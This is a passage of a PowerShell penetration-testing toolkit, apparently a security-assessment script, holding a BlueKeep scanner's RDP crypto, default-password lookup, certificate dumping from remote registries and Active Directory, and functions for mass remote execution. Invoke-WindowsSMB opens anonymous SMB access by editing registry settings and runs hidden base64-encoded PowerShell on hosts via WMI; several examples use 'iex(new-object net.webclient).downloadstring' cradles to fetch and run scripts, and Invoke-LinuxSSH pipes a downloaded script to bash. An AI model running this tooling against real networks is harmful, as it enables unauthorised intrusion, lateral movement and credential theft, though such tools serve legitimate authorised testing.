				md5.TransformFinalBlock(serverRand, 0, serverRand.Length);
				return md5.Hash;
			}
		}

		// https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rdpbcgr/7c61b54e-f6cd-4819-a59a-daf200f6bf94
		static byte[] Hmac(byte[] data, byte[] key)
		{
			byte[] pad1 = new byte[40];
			byte[] pad2 = new byte[48];
			for (int i = 0; i < pad1.Length; i++) pad1[i] = 0x36;
			for (int i = 0; i < pad2.Length; i++) pad2[i] = 0x5c;

			using (SHA1 sha1 = SHA1.Create())
			using (MD5 md5 = MD5.Create())
			{
				sha1.TransformBlock(key, 0, key.Length, key, 0);
				sha1.TransformBlock(pad1, 0, pad1.Length, pad1, 0);
				sha1.TransformBlock(BitConverter.GetBytes(data.Length), 0, 4, BitConverter.GetBytes(data.Length), 0);
				sha1.TransformFinalBlock(data, 0, data.Length);

				md5.TransformBlock(key, 0, key.Length, key, 0);
				md5.TransformBlock(pad2, 0, pad2.Length, pad2, 0);
				md5.TransformFinalBlock(sha1.Hash, 0, sha1.Hash.Length);

				byte[] output = new byte[8];
				Array.Copy(md5.Hash, output, output.Length);
				return output;
			}
		}

		public class RDP_RC4
		{
			byte[] s;
			int i = 0;
			int j = 0;

			public RDP_RC4(byte[] key)
			{
				s = EncryptInitalize(key);
			}

			private static byte[] EncryptInitalize(byte[] key)
			{
				byte[] s = new byte[256];
				for (int i = 0; i < 256; i++)
				{
					s[i] = (byte) i;
				}

				for (int i = 0, j = 0; i < 256; i++)
				{
					j = (j + key[i % key.Length] + s[i]) & 255;

					Swap(s, i, j);
				}

				return s;
			}

			public byte[] Encrypt(byte[] data)
			{
				
				byte[] output = new byte[data.Length];
				for (int l = 0; l < data.Length; l++)
				{
					byte b = data[l];
					i = (i + 1) & 255;
					j = (j + s[i]) & 255;

					Swap(s, i, j);

					output[l] = (byte)(b ^ s[(s[i] + s[j]) & 255]);
				}
				return output;
			}

			private static void Swap(byte[] s, int i, int j)
			{
				byte c = s[i];

				s[i] = s[j];
				s[j] = c;
			}
		}

		static byte[] EncryptPkt(byte[] data, RDP_RC4 Encrypt, byte[] hmacKey, int flags)
		{
			return EncryptPkt(data, Encrypt, hmacKey, flags, 0x3eb);
		}

		static byte[] EncryptPkt(byte[] data, RDP_RC4 Encrypt, byte[] hmacKey)
		{
			return EncryptPkt(data, Encrypt, hmacKey, 8, 0x3eb);
		}

		static byte[] EncryptPkt(byte[] data, RDP_RC4 Encrypt, byte[] hmacKey, int flags, int channelId)
		{
			int udl_with_flag = 0x8000 | (data.Length + 12);

			MemoryStream ms = new MemoryStream();
			BinaryReader reader = new BinaryReader(ms);

			byte[] part1 = new byte[] {
				0x02,0xf0, 0x80, // # X.224
				0x64,  // sendDataRequest
				0x00, 0x08, // intiator userId .. TODO: for a functional client this isn't static
				(byte)(channelId / 0x100), (byte)(channelId % 0x100), // channelId = 1003
				0x70, // dataPriority
			};
			ms.Write(part1, 0, part1.Length);
			ms.WriteByte((byte) (udl_with_flag / 0x100));
			ms.WriteByte((byte)(udl_with_flag % 0x100));
			ms.Write(BitConverter.GetBytes(flags), 0, 2);
			ms.Write(BitConverter.GetBytes(0), 0, 2);

			byte[] hmac = Hmac(data, hmacKey);
			ms.Write(hmac, 0, hmac.Length);

			byte[] rc4 = Encrypt.Encrypt(data);
			ms.Write(rc4, 0, rc4.Length);

			ms.Seek(0, SeekOrigin.Begin);

			byte[] output = reader.ReadBytes((int)reader.BaseStream.Length);
			return output;
		}
	}
}
"@
	Add-Type -TypeDefinition $source
	$list = New-Object System.Collections.ArrayList
	$ComputerName | foreach {
		try{
			$data = New-Object  PSObject -Property @{
				"ComputerName" = $_
				"Status"       = [PingCastle.bluekeeptest]::ScanForBlueKeep($_)
			}
			$list.add($data) | Out-Null
		}catch{}
	}
	return $list
}
function Get-DefaultPassword{
    <#
    .SYNOPSIS
    Author: Cube0x0
    License: BSD 3-Clause

    Uses html parsing so if website changes anything, it may break

    .EXAMPLE
    PS /root/LogonTracer> Get-DefaultPassword d-link                                                                                                                        
    Product  : D-Link 1. D-Link - 604                                                                                                                                       
    Version  :                                                                                                                                                              
    Method   : Telnet                                                                                                                                                       
    Username : Admin                                                                                                                                                        
    Password : (none)                                                                                                                                                       
    Level    : Administrator                                                                                                                                                
    Doc      :                                                                                                                                                              

    Product  : D-Link 2. D-Link - DCS-2121                                                                                                                                  
    Version  : 1.04                                                                                                                                                         
    Method   :                                                                                                                                                              
    Username : root                                                                                                                                                         
    Password : admin                                                                                                                                                        
    Level    : Administrator                                                                                                                                                
    Doc      : http://newsoft-tech.blogspot.com/2010/09/d-link-dcs-2121-and-state-of-embedded.html                                                                          
               http://newsoft-tech.blogspot.com/2010/09/d-link-dcs-2121-and-state-of-embedded.html 
    #>
	param(
        [ValidateNotNullOrEmpty()]
        [Parameter(Position=0,Mandatory=$true,ValueFromPipeline=$true)]
		[string]$vendor
    )
    begin{
        if(-not(Get-Module PowerHTML -ListAvailable)){
            Write-Output "[-] Install-module PowerHTML -force"
            return
        }
        try{
            Import-Module PowerHTML -ErrorAction stop
        }catch{
            Write-Output "[-] Could not import PowerHTML"
            return
        }
        try{
            $html = (Invoke-WebRequest "https://cirt.net/passwords?criteria=$vendor" -ErrorAction stop | ConvertFrom-Html)
        }catch{
            Write-Output "[-] Could not connect to cirt.net"
            Write-Output "[-] $($_.Exception.Message)"
            return
        }
        $tables = $html.SelectNodes('//table').outerhtml
    }
    process{
	    foreach($table in $tables){
	    	$list = ($table | Convertfrom-html).selectnodes('//tr/td').innerhtml
	    	[pscustomobject]@{
                Product  = [string]($list | Select-String -Pattern '<H3><B>' -Context 0,1).line.replace('<a name="','').Replace('"></a><h3><b>',' ').replace('&nbsp;','').Replace('<i>','').Replace('</i><b></b></b></h3>','')
                Version  = [string]($list | Select-String -Pattern '<B>Version</B>' -Context 0,1).Context.PostContext
	    		Method	 = [string]($list | Select-String -Pattern '<B>Method</B>' -Context 0,1).Context.PostContext
	    		Username = [string]($list | Select-String -Pattern '<B>User ID</B>' -Context 0,1).Context.PostContext
	    		Password = [string]($list | Select-String -Pattern '<B>Password</B>' -Context 0,1).Context.PostContext
	    		Level	 = [string]($list | Select-String -Pattern '<B>Level</B>' -Context 0,1).Context.PostContext
	    		Doc 	 = [string]($list | Select-String -Pattern '<B>Doc</B>' -Context 0,1).Context.PostContext.replace('<a href="','').replace('"></a>','').replace('</a>','').replace('">',' ')
	    	}
        }
    }
}
function Get-RemoteCertificates{
    <#
    .SYNOPSIS
    Author: Cube0x0
    License: BSD 3-Clause

    .DESCRIPTION
    Download certificates from remote machine

    .EXAMPLE
    Get-RemoteCertificates -ComputerName dc.hackme.local -Output out
    'desktop-bbrc9rr','192.168.3.10','192.168.3.11' | Get-RemoteCertificates
    Get-RemoteCertificates -ComputerName desktop-bbrc9rr -Verbose
    [+] Connected to desktop-bbrc9rr
    VERBOSE: [*] Sids: .DEFAULT,S-1-5-19,S-1-5-20,S-1-5-21-888311446-1519639889-3643310532-1001,S-1-5-21-888311446-1519639889-3643310532-1001_Classes,S-1-5-18
    VERBOSE: [+] Writing certificate 90E98BB05040666936B20E23F209B10C3CBC4D96-CA.cer
    VERBOSE: [+] Writing certificate 417E225037FBFAA4F95761D5AE729E1AEA7E3A42-CA.cer
    VERBOSE: [+] Writing certificate 7EED6032C9F56387EC734CBBF32BFC14DB6DE0A2-CA.cer
    VERBOSE: [+] Writing certificate 7FCAC26BCF7B5BF7E68CD99E72F1F25AE16614F3-CA.cer
    VERBOSE: [+] Writing certificate 83DA05A9886F7658BE73ACF0A4930C0F99B92F01-CA.cer
    VERBOSE: [+] Writing certificate 8AD5C9987E6F190BD6F5416E2DE44CCD641D8CDA-CA.cer
    VERBOSE: [+] Writing certificate 8BFE3107712B3C886B1C96AAEC89984914DC9B6B-CA.cer
    VERBOSE: [+] Writing certificate 905DE119F6A0118CFFBF8B69463EFE5BD0C1D322-CA.cer
    VERBOSE: [+] Writing certificate F960E82855F1C52C8B162DD93EDA220B3DFF1389-CA.cer
    VERBOSE: [+] Writing certificate 7FCAC26BCF7B5BF7E68CD99E72F1F25AE16614F3-Root.cer
    [+] Connected to 192.168.3.10
    VERBOSE: [*] Sids: .DEFAULT,S-1-5-19,S-1-5-20,S-1-5-18
    [-] Could not open hive, permission denied
    #>
    [cmdletbinding()]
    param(
        [ValidateNotNullOrEmpty()]
        [Parameter(Position=0,Mandatory=$true,ValueFromPipeline=$true,ValueFromPipelineByPropertyName=$true)]
        $ComputerName,
        
        [ValidateNotNullOrEmpty()]
        [Parameter(Position=1)]
        [string]
        $Output = "$(Get-Location)/output"
    )
    begin{
        if(-not(Test-Path $Output)){
            New-Item -ItemType Directory -ErrorAction SilentlyContinue $Output | Out-Null
        }
    }
    process{
        $up=Test-Connection $ComputerName -Count 1 -Delay 3 -ErrorAction SilentlyContinue
        if(-not($up)){
            "`n[-] Could not connect to $ComputerName"
            return
        }
        New-Item -ItemType Directory -ErrorAction SilentlyContinue $Output\$ComputerName | Out-Null
        $reg = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('Users', $ComputerName)
        try{
            $sids = $reg.GetSubKeyNames()
        }catch{
            Write-Output "`n[-] Could not get sids from $ComputerName"
            return
        }
        Write-Output "`n[+] Connected to $ComputerName"
        Write-Verbose "[*] Sids: $sids"
        foreach($sid in $sids){
            New-Item -ItemType Directory -ErrorAction SilentlyContinue $Output\$ComputerName\$sid | Out-Null
            try{
                $CA = $reg.OpenSubKey("$sid\SOFTWARE\Microsoft\SystemCertificates\CA\Certificates\")
                $Root = $reg.OpenSubKey("$sid\SOFTWARE\Microsoft\SystemCertificates\root\Certificates\")
            }catch{
                Write-Output "[-] Could not open hive, permission denied"
                return
            }
            try{
                $CA.GetSubKeyNames() | foreach {
                    $Cert = $reg.OpenSubKey("$sid\SOFTWARE\Microsoft\SystemCertificates\CA\Certificates\$_")
                    [byte[]]$blob=$cert.GetValue('blob')
                    Write-Verbose "[+] Writing certificate $_-CA.cer"
                    [IO.File]::WriteAllBytes("$Output\$ComputerName\$sid\$_-CA.cer", $Blob)
                }
            }catch{}
            try{
                $Root.GetSubKeyNames() | foreach {
                    $Cert = $reg.OpenSubKey("$sid\SOFTWARE\Microsoft\SystemCertificates\Root\Certificates\$_")
                    [byte[]]$blob=$cert.GetValue('blob')
                    Write-Verbose "[+] Writing certificate $_-Root.cer"
                    [IO.File]::WriteAllBytes("$Output\$ComputerName\$sid\$_-Root.cer", $Blob)
                }
            }catch{}
        }
    }
}
function Get-DomainCertificates{
    <#
    .SYNOPSIS
    Author: Cube0x0
    License: BSD 3-Clause

    .EXAMPLE
    Get-DomainCertificates -Verbose
    VERBOSE: [*] Domain: hackme.local
    VERBOSE: [*] Output folder: C:\Users\administrator.HACKME\Desktop\output
    [*] Dumping Enrollment Certificates
    VERBOSE: [*] Writing Enrollment-hackme-ADCS-2019-CA)
    [*] Dumping AIA certificates
    VERBOSE: [*] Writing AIA-hackme-ADCS-2019-CA)
    [*] Dumping Revoked Certificates
    VERBOSE: [*] Writing Revoke*-hackme-ADCS-2019-CA)
    PS C:\Users\administrator.HACKME\Desktop> tree.com /F
    Folder PATH listing
    Volume serial number is A4D6-C634
    C:.
    └───output
        │   AIA-hackme-ADCS-2019-CA.cer
        │   Enrollment-hackme-ADCS-2019-CA.cer
        │   RevokeBASE-hackme-ADCS-2019-CA.crl
        │   RevokeDelta-hackme-ADCS-2019-CA.crl
        │
        └───System.DirectoryServices.DirectoryEntry.cn
    #>
    [cmdletbinding()]
    param (
        [string]$Domain,
        
        [string]$DistinguishedName,
        
        [ValidateScript({test-path $_})]
        [string]$Output="$pwd\output"
    )
    begin{
        if(!$Domain){
            try{
                $domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            }catch{
                Write-Output "[-] $($_.Exception.Message)"
                Write-Output "Use runas.exe with -domain and -domaincontroller"
                return
            }
        }
        Write-Verbose "[*] Domain: $domain"
        Write-Verbose "[*] Output folder: $output"
        if(!$DistinguishedName){
            $DistinguishedName = "DC=$($Domain.replace(".", ",DC="))"
        }
        if(-not(test-path $Output)){
            New-Item -ItemType Directory -ErrorAction SilentlyContinue $Output | Out-Null
        }
    }
    process{
        Write-Output "[*] Dumping Enrollment Certificates"
        try{
            $CAs = ([ADSI]"LDAP://CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,$DistinguishedName").Children
        }catch{
            Write-Output "Failed connecting to ldap"
            Write-Output "[-] $($_.Exception.Message)"
            return
        }
        foreach ($CA in $CAs) {
            New-Item -ItemType Directory -ErrorAction SilentlyContinue $Output\$ca.cn | Out-Null
            Write-Verbose "[*] Writing Enrollment-$($CA.cn))"
            [byte[]]$blob=$CA.cACertificate.value
            [IO.File]::WriteAllBytes("$Output\Enrollment-$($CA.cn).cer", $Blob)
        }

        Write-Output "[*] Dumping AIA certificates"
        try{
            $AIAs = ([ADSI]"LDAP://CN=AIA,CN=Public Key Services,CN=Services,CN=Configuration,$DistinguishedName").Children
        }catch{
            Write-Output "Failed connecting to ldap"
            Write-Output "[-] $($_.Exception.Message)"
            return
        }
        foreach ($AIA in $AIAs) {
            New-Item -ItemType Directory -ErrorAction SilentlyContinue $Output\$AIA.cn | Out-Null
            Write-Verbose "[*] Writing AIA-$($AIA.cn))"
            [byte[]]$blob=$AIA.cACertificate.value
            [IO.File]::WriteAllBytes("$Output\AIA-$($AIA.cn).cer", $Blob)
        }

        Write-Output "[*] Dumping Revoked Certificates"
        try{
            $CDPs = ([ADSI]"LDAP://CN=CDP,CN=Public Key Services,CN=Services,CN=Configuration,$DistinguishedName")
        }catch{
            Write-Output "Failed connecting to ldap"
            Write-Output "[-] $($_.Exception.Message)"
            return
        }
        foreach ($CDP in $CDPs.Children) {
            foreach($Certs in $CDP.Children){
                foreach($cert in $certs){
                    New-Item -ItemType Directory -ErrorAction SilentlyContinue $Output\$cert.cn | Out-Null
                    Write-Verbose "[*] Writing Revoke*-$($cert.cn))"
                    [byte[]]$blob=$cert.certificateRevocationList.value
                    [IO.File]::WriteAllBytes("$Output\RevokeBASE-$($cert.cn).crl", $Blob)
                    [byte[]]$blob=$cert.deltaRevocationList.value
                    [IO.File]::WriteAllBytes("$Output\RevokeDelta-$($cert.cn).crl", $Blob)
                }
            }
        }
    }
}
function Invoke-WindowsSMB {
    <#
        Author: Cube0x0
        License: BSD 3-Clause

        .SYNOPSIS
        Uses WMI and a local smb server
        RUN THIS ON A DOMAIN JOINED PC FOR BEST RESULTS

        .PARAMETER Hosts
        Array of hostnames

        .PARAMETER HostList
        List of hostnames

        .PARAMETER Command
        PowerShell one-liner command to run.

        .PARAMETER SMBFolder
        Folder to pipe host outputs to.

        .PARAMETER FQDN
        FQDN for your machine
    #>
    [cmdletbinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$true)]
        [String[]]
        $Hosts,

        [String]
        $HostList,

        [Parameter(Mandatory=$true)]
        [String]
        $Command = "iex(new-object net.webclient).downloadstring('http://localhost/Invoke-WinEnum.ps1');invoke-winenum -extended",

        [Parameter(Mandatory=$true)]
        [String]
        $SMBFolder="C:\smb",

        [Parameter(Mandatory=$true)]
        [string]
        $FQDN
    )
    if($HostList){
        if (Test-Path -Path $HostList){
            try{
                $Hosts += Get-Content -Path $HostList -ErrorAction Stop
            }catch{
                throw
            }
        }
        else {
            Write-Output "[!] Input file doesn't exist!"
            return
        }
    }
    
    if(!(Test-Path $SMBFolder)){
        Write-Output "[*]Creating smb folder"
        New-Item -Force -ItemType directory -Path $SMBFolder | Out-Null
    }
    #https://serverfault.com/questions/51635/how-can-an-unauthenticated-user-access-a-windows-share
    Write-Output "[*]Modifying registry to allow anonymous smb access"
    New-ItemProperty -Path HKLM:\System\CurrentControlSet\Control\Lsa\ -Name everyoneincludesanonymous -PropertyType DWord -Value "1" –Force | Out-Null
    New-ItemProperty -Path HKLM:\System\CurrentControlSet\Control\Lsa\ -Name restrictanonymous -PropertyType DWord -Value "0" –Force | Out-Null
    New-ItemProperty -Path HKLM:\System\CurrentControlSet\Services\LanManServer\Parameters -Name NullSessionShares -PropertyType MultiString -Value "temp" –Force | Out-Null
    New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\LanManServer\Parameters\ -Name  RestrictNullSessAccess -PropertyType DWord -Value "0" –Force | Out-Null

    Write-Output "[*]Creating smb share and setting permissions"
    try{
        New-SmbShare -Path $SMBFolder -ChangeAccess 'Anonymous logon','Everyone','Guest' -name temp -ErrorAction stop | Out-Null
    }catch{
        throw
    }
    icacls $SMBFolder /grant Everyone:M
    $timer = [Diagnostics.Stopwatch]::StartNew()
    $hostscount=New-Object System.Collections.ArrayList

    foreach($_host in $hosts) {
        $_command = "$Command | out-file -encoding ascii -FilePath  \\$FQDN\temp\$_host"
        Write-Output "[*]Executing: $_command on $_host"
        $encodedCommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($_Command))
        try{
            Invoke-WmiMethod -ComputerName $_host -Path Win32_process -Name create -ArgumentList "Powershell.exe -NoLogo -NonInteractive -ExecutionPolicy Unrestricted -WindowStyle Hidden -EncodedCommand $encodedCommand" -ErrorAction Stop | out-null
            $hostscount.add($_host) | Out-Null
        }catch{
            Write-Output "[-]Failed executing WMI on $_host"
        }
    }

    while($done.Count -ne $hostscount.Count){
        Start-Sleep -Seconds 10
        $done=New-Object System.Collections.ArrayList
        $checkedin=New-Object System.Collections.ArrayList
        $c=$null
        $d=$null
        try{
            $c = (gci $SMBFolder | where {$_.Length -lt 50}).name
        }catch{}
        try{
            $d = (gci $SMBFolder | where {$_.Length -gt 50}).name
        }catch{}
        foreach($_host in $c){
            if($_host -notin $checkedin){
                $checkedin.Add($_host) | Out-Null
            }
        }
        foreach($_host in $d){
            if($_host -notin $done){
                $done.Add($_host) | Out-Null
            }
        }
        Write-Output "[*]Checkedin`n$checkedin`n[*]Done`n$done`n"
    }
    $timer.Stop()
    Write-Output "Scan took $($timer.Elapsed.TotalSeconds) Seconds"

    Write-Output "[*]Removing smb share and permissions"
    Remove-SmbShare temp -Confirm:$false
    icacls $SMBFolder /remove Everyone:M

    Write-Output "[*]Restoring registry back to default"
    New-ItemProperty -Path HKLM:\System\CurrentControlSet\Control\Lsa\ -Name everyoneincludesanonymous -PropertyType DWord -Value "0" –Force | Out-Null
    New-ItemProperty -Path HKLM:\System\CurrentControlSet\Control\Lsa\ -Name restrictanonymous -PropertyType DWord -Value "1" –Force | Out-Null
    New-ItemProperty -Path HKLM:\System\CurrentControlSet\Services\LanManServer\Parameters -Name NullSessionShares -PropertyType MultiString -Value "" –Force | Out-Null
    New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\LanManServer\Parameters\ -Name  RestrictNullSessAccess -PropertyType DWord -Value "1" –Force | Out-Null
}
function Invoke-WindowsWMI{
    <#
    .SYNOPSIS
    Author: Cube0x0
    License: BSD 3-Clause

    Install-Module -Name PoshRSJob -Force
    Too big scripts will not work with ScriptPath

    Invoke-WindowsWMI -Url 'http://10.10.10.123/WinEnum.ps1'
    Invoke-WindowsWMI -ScriptPath 'invoke-stager.ps1'
    #>
    param (
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [string[]]$Hosts,

        [ValidateScript({Test-Path -Path $_ })]
        [string]$HostList,
        
        [ValidateScript({Test-Path -Path $_ })]
        $ScriptPath,

        [string]$Command,

        [string]$OutputFolder = "$((Get-Location).path)\windows",

        [int32]$Threads = 10
    )
    function Invoke-WMIExec{
        <#        
            .SYNOPSIS
             Execute command remotely and capture output, using only WMI.
             Copyright (c) Noxigen LLC. All rights reserved.
             Licensed under GNU GPLv3.
        
            .DESCRIPTION
            This is proof of concept code. Use at your own risk!
            
            Execute command remotely and capture output, using only WMI.
            Does not reply on PowerShell Remoting, WinRM, PsExec or anything
            else outside of WMI connectivity.
            
            .LINK
            https://github.com/OneScripter/WmiExec
            
            .EXAMPLE
            PS C:\> .\WmiExec.ps1 -ComputerName SFWEB01 -Command "gci c:\; hostname"
        
            .NOTES
            ========================================================================
                 NAME:		WmiExec.ps1
                 
                 AUTHOR:	Jay Adams, Noxigen LLC
                             
                 DATE:		6/11/2019
                 
                 Create secure GUIs for PowerShell with System Frontier.
                 https://systemfrontier.com/powershell
            ==========================================================================
        #>
        Param(
            [string]$ComputerName,
            [string]$Command
        )
        
        function CreateScriptInstance([string]$ComputerName)
        {
            # Check to see if our custom WMI class already exists
            $classCheck = Get-WmiObject -Class Noxigen_WmiExec -ComputerName $ComputerName -List -Namespace "root\cimv2"
            
            if ($classCheck -eq $null)
            {
                # Create a custom WMI class to store data about the command, including the output.
                $newClass = New-Object System.Management.ManagementClass("\\$ComputerName\root\cimv2",[string]::Empty,$null)
                $newClass["__CLASS"] = "Noxigen_WmiExec"
                $newClass.Qualifiers.Add("Static",$true)
                $newClass.Properties.Add("CommandId",[System.Management.CimType]::String,$false)
                $newClass.Properties["CommandId"].Qualifiers.Add("Key",$true)
                $newClass.Properties.Add("CommandOutput",[System.Management.CimType]::String,$false)
                $newClass.Put() | Out-Null
            }
            
            # Create a new instance of the custom class so we can reference it locally and remotely using this key
            $wmiInstance = Set-WmiInstance -Class Noxigen_WmiExec -ComputerName $ComputerName
            $wmiInstance.GetType() | Out-Null
            $commandId = ($wmiInstance | Select-Object -Property CommandId -ExpandProperty CommandId)
            $wmiInstance.Dispose()
            
            # Return the GUID for this instance
            return $CommandId
        }
        
        function GetScriptOutput([string]$ComputerName, [string]$CommandId)
        {
            $wmiInstance = Get-WmiObject -Class Noxigen_WmiExec -ComputerName $ComputerName -Filter "CommandId = '$CommandId'"
            $result = ($wmiInstance | Select-Object CommandOutput -ExpandProperty CommandOutput)
            $wmiInstance | Remove-WmiObject
            return $result
        }
        
        function ExecCommand([string]$ComputerName, [string]$Command)
        {
            #Pass the entire remote command as a base64 encoded string to powershell.exe
            $commandLine = "powershell.exe -NoLogo -NonInteractive -ExecutionPolicy Unrestricted -WindowStyle Hidden -EncodedCommand " + $Command
            $process = Invoke-WmiMethod -ComputerName $ComputerName -Class Win32_Process -Name Create -ArgumentList $commandLine
            
            if ($process.ReturnValue -eq 0)
            {
                $started = Get-Date
                
                Do
                {
                    if ($started.AddMinutes(2) -lt (Get-Date))
                    {
                        Write-Host "PID: $($process.ProcessId) - Response took too long."
                        break
                    }
                    
                    # TODO: Add timeout
                    $watcher = Get-WmiObject -ComputerName $ComputerName -Class Win32_Process -Filter "ProcessId = $($process.ProcessId)"
                    
                    Write-Host "PID: $($process.ProcessId) - Waiting for remote command to finish..."
                    
                    Start-Sleep -Seconds 1
                }
                While ($watcher -ne $null)
                
                # Once the remote process is done, retrieve the output
                $scriptOutput = GetScriptOutput $ComputerName $scriptCommandId
                
                return $scriptOutput
            }
        }
        
        function Main()
        {
            $commandString = $Command
            
            # The GUID from our custom WMI class. Used to get only results for this command.
            $scriptCommandId = CreateScriptInstance $ComputerName
            
            if ($scriptCommandId -eq $null)
            {
                Write-Error "Error creating remote instance."
                exit
            }
            
            # Meanwhile, on the remote machine...
            # 1. Execute the command and store the output as a string
            # 2. Get a reference to our current custom WMI class instance and store the output there!
                
            $encodedCommand = "`$result = Invoke-Command -ScriptBlock {$commandString} | Out-String; Get-WmiObject -Class Noxigen_WmiExec -Filter `"CommandId = '$scriptCommandId'`" | Set-WmiInstance -Arguments `@{CommandOutput = `$result} | Out-Null"
            
            $encodedCommand = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($encodedCommand))
            
            $result = ExecCommand $ComputerName $encodedCommand
            
            Write-Host "[+]Results`n"
            Write-Output $result
        }
        main
    }
    if($HostList){
        if(Test-Path $HostList){
            try{
                $Hosts += Get-Content $Computers -ErrorAction Stop
            }catch{
                throw
            }
        }
    }
    #Import dependencies
    try{
        Import-Module PoshRSJob -ErrorAction Stop
    }catch{
        Write-Output "[-] install-module PoshRSJob"
        return
    }
    #Error checking
    if(($null -eq $command) -and ($null -eq $ScriptPath)){
        return
    }
    #Create output folder
    if(-not(Test-Path $OutputFolder)){
        New-Item -ItemType Directory $OutputFolder | Out-Null
    }
    #Args
    if($ScriptPath){
        $command=Get-Content $ScriptPath -ErrorAction Stop
    }
    $Enc=[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($command))
    $ScriptParams = @{
        'Location' = $OutputFolder
        'Enc' = $Enc
    }
    $hosts | start-rsjob -Throttle $Threads -Name {$_} -ArgumentList $ScriptParams -FunctionFilesToImport "$PSScriptRoot\securityassessment.ps1" -ScriptBlock {
        param(
            $Inputargs
        )
        $Location = $Inputargs.Location
        $Enc = $Inputargs.Enc
        
        $output = Invoke-WMIExec -ComputerName $_ -Command $command
        Add-Content -Path "$Location\$_" -Value $output
    } | Wait-RSJob -ShowProgress
}
function Invoke-WindowsPS{
    <#
    .SYNOPSIS
    Author: Cube0x0
    License: BSD 3-Clause

    Install-Module -Name PoshRSJob -Force
    Too big scripts will not work with ScriptPath

    Invoke-WindowsPS -hosts pc1,pc2 -Command "iex(new-object net.webclient).downloadstring('http://192.168.4.1/invoke-winenum.ps1');invoke-winenum -extended"
    Invoke-WindowsPS -hostlist pc.txt -ScriptPath 'invoke-stager.ps1'
    #>
    param (
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [string[]]$Hosts,

        [ValidateScript({Test-Path -Path $_ })]
        [string]$HostList,
        
        [ValidateScript({Test-Path -Path $_ })]
        $ScriptPath,

        [string]$Command,

        [string]$OutputFolder = "$((Get-Location).path)\windows",

        [int32]$Threads = 10
    )
    #Import ComputerNames
    if($HostList){
        if(Test-Path $HostList){
            try{
                $Hosts += Get-Content $Computers -ErrorAction Stop
            }catch{
                throw
            }
        }
    }
    #Import dependencies
    try{
        Import-Module PoshRSJob
    }catch{
        Write-Output "[-] install-module PoshRSJob"
        return
    }
    #Error checking
    if(($null -eq $Command) -and ($null -eq $ScriptPath)){
        Write-Output "[-]Need -Command or -scriptpath"
        return
    }
    #Create output folder
    if(-not(Test-Path $OutputFolder)){
        New-Item -ItemType Directory -Path $OutputFolder | Out-Null
    }
    #Args
    if($ScriptPath){
        $Command=Get-Content $ScriptPath -ErrorAction Stop
    }
    $Enc=[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($Command))
    $ScriptParams = @{
        'Location' = $OutputFolder
        'Enc' = $Enc
    }
    $Hosts | start-rsjob -Throttle $Threads -Name {$_} -ArgumentList $ScriptParams -ScriptBlock {
            param(
                $Inputargs
            )
            #parse args
            $Enc = $Inputargs.Enc
            $computername = $_
            $Location = "$($Inputargs.Location)\$computername"
            #create PSSessions
            try{
                $session = New-PSSession -ComputerName $computername -ErrorAction Stop
            }catch{
                Add-Content -Path $Location -Value '[-] Error connecting to host'
                Add-Content -Path $Location -Value "[-] $($_.Exception.Message)"
                return
            }
            try{
                $output = Invoke-Command -Session $session -ScriptBlock {powershell.exe -NoLogo -NonInteractive -ExecutionPolicy Unrestricted -WindowStyle Hidden -EncodedCommand $args[0]} -ArgumentList $Enc
            }catch{
                $output = "[-] $($_.Exception.Message)"
            }
            Add-Content -Path $Location -Value $output
            Remove-PSSession $session
            
    } | Wait-RSJob -ShowProgress
}
function Invoke-LinuxSSH{
    <#
    .SYNOPSIS
    Author: Cube0x0
    License: BSD 3-Clause

    import-csv linux.csv
    ComputerName Username Password
    ------------ -------- --------
    192.168.1.40 cube     cube

    Invoke-Linux -computers
    Invoke-linux -computers -script

    Install-Module -Name Posh-SSH -Force
    Install-Module -Name PoshRSJob -Force
    #>
    param (
        [Parameter(Position=0,ValueFromPipeline=$True)]
        $Computers = '.\linux.csv',
        
        [ValidateScript({Test-Path -Path $_ })]
        [string]$ScriptPath,

        [string]$OutputFolder = "($(Get-Location).path)\linux",

        [int32]$Threads = 10
    )
    #Import ComputerName, Username, Passwords from CSV
    if(Test-Path $Computers){
        try{
            $Computers = import-csv $Computers -ErrorAction Stop
        }catch{
            throw
        }
    }
    #Import dependencies
    try{
        Import-Module PoshRSJob -ErrorAction Stop
        Import-Module Posh-SSH -ErrorAction Stop
    }catch{
        throw
    }
    #Create output folder
    if(-not(Test-Path $OutputFolder)){
        New-Item -ItemType Directory $OutputFolder | Out-Null
    }
    #Get latest LinEnum.sh
    #Use a local copy for extended testing
    if($ScriptPath){
        try{
            $Script = Get-Content $ScriptPath -ErrorAction Stop
        }catch{
            Write-Output "[-] Can't read script"
            throw
        }
    }else{
        try{
            $Script = (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh')
        }catch{
            Write-Output "[-] Can't Download LinEnum"
            throw
        }
    }
    #Params
    $ScriptParams = @{
        'Script' = $Script
        'Location' = $OutputFolder
    }
    $Computers | start-rsjob -Throttle $Threads -Name {$_.computername} -ArgumentList $ScriptParams -ModulesToImport 'Posh-SSH' -ScriptBlock {
        param($Inputargs)
        $Script = $Inputargs.Script
        $Location = $Inputargs.Location
        $secpasswd = ConvertTo-SecureString $_.password -AsPlainText -Force
        $creds = New-Object System.Management.Automation.PSCredential ($_.username, $secpasswd)
        try{
            $session = New-SSHSession -ComputerName $_.ComputerName -Credential $creds -Force -WarningAction SilentlyContinue
        }catch{
            Add-Content -Path "$Location\$($_.ComputerName)" -Value '[-] Error connecting to host'
        }
        if($session){
            $output = (Invoke-SSHCommand -SSHSession $session -Command "$script | /bin/bash")
            Add-Content -Path "$Location\$($_.ComputerName)" -Value $output.output
            Remove-SSHSession -SSHSession $session | Out-Null
        }
    } | Wait-RSJob -ShowProgress
}
function Get-GroupPolicyPassword {
    <#
    .SYNOPSIS
    
    Retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences.
    
    PowerSploit Function: Get-GPPPassword  
